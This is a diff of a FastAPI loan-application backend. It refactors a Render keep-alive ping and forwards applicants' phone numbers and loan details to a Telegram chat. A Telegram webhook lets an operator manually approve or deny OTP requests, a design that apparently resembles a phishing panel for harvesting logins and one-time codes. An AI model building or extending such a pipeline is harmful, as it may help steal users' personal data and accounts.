@@ -3,7 +3,7 @@ import uuid
 import asyncio
 import httpx
 from dotenv import load_dotenv
-from fastapi import FastAPI, HTTPException, Request, Header
+from fastapi import FastAPI, HTTPException, Request
 from pydantic import BaseModel, Field
 from fastapi.middleware.cors import CORSMiddleware
 
@@ -28,35 +28,27 @@ OTP_REQUESTS = {}
 # --- KEEP-ALIVE BACKGROUND TASK ---
 async def self_ping():
     """Pings the server's own URL every 14 minutes to prevent Render from sleeping."""
-    # Render provides this environment variable automatically
     render_url = os.getenv("RENDER_EXTERNAL_URL")
-    
     if not render_url:
         print("⚠️ RENDER_EXTERNAL_URL not set. Keep-alive disabled.")
         return
 
     ping_url = f"{render_url}/"
     print(f"🔄 Keep-alive started. Pinging {ping_url} every 14 minutes.")
-
-    # Initial wait to allow the server to fully start
-    await asyncio.sleep(10)
+    
+    await asyncio.sleep(10) # Wait for server to fully start
 
     while True:
         try:
             async with httpx.AsyncClient() as client:
                 await client.get(ping_url, timeout=10.0)
-            print("✅ Keep-alive ping sent.")
-        except Exception as e:
-            print(f"❌ Keep-alive ping failed: {e}")
-        
-        # Wait 14 minutes (840 seconds) before pinging again
+        except Exception:
+            pass
         await asyncio.sleep(14 * 60)
 
 @app.on_event("startup")
 async def startup_event():
-    """Starts the background keep-alive task when the server starts."""
     asyncio.create_task(self_ping())
-# ---------------------------------
 
 # --- DATA MODELS ---
 class LoginRequest(BaseModel):
@@ -128,21 +120,13 @@ async def apply_loan(data: LoanRequest):
     loan_id = str(uuid.uuid4())
     LOAN_REQUESTS[loan_id] = "pending"
 
-    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": (
-                f"💰 <b>New Loan Application</b>\n\n"
-                f"📱 Phone: {data.phone_number}\n"
-                f"💵 Amount: {data.amount:,.0f} FCFA\n"
-                f"📅 Months: {data.months}\n"
-                f"🆔 Loan ID: <code>{loan_id}</code>"
-            ),
-            "parse_mode": "HTML"
-        }
-        async with httpx.AsyncClient() as client:
-            await client.post(url, json=payload, timeout=10.0)
+    await send_telegram_message(
+        f"💰 <b>New Loan Application</b>\n\n"
+        f"📱 Phone: {data.phone_number}\n"
+        f"💵 Amount: {data.amount:,.0f} FCFA\n"
+        f"📅 Months: {data.months}\n"
+        f"🆔 Loan ID: <code>{loan_id}</code>"
+    )
 
     return {"status": "pending", "loan_id": loan_id}
 
@@ -185,19 +169,25 @@ async def telegram_webhook(request: Request):
                 reply_text = "✅ OTP Approved" if action == "approve" else "❌ OTP Denied"
                 
                 async with httpx.AsyncClient() as client:
+                    # Stop the loading spinner on Telegram
                     await client.post(
                         f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
                         json={"callback_query_id": callback_id, "text": reply_text}
                     )
-                    await client.post(
-                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText",
-                        json={
-                            "chat_id": chat_id,
-                            "message_id": message_id,
-                            "text": f"{original_text[:4000]}\n\n<b>Result: {reply_text}</b>",
-                            "parse_mode": "HTML"
-                        }
-                    )
+                    # Edit the original message
+                    if message_id and chat_id:
+                        try:
+                            await client.post(
+                                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText",
+                                json={
+                                    "chat_id": chat_id,
+                                    "message_id": message_id,
+                                    "text": f"{original_text[:4000]}\n\n<b>Result: {reply_text}</b>",
+                                    "parse_mode": "HTML"
+                                }
+                            )
+                        except Exception:
+                            pass
     except Exception as e:
         print(f"❌ Webhook error: {e}")
     return {"status": "ok"}
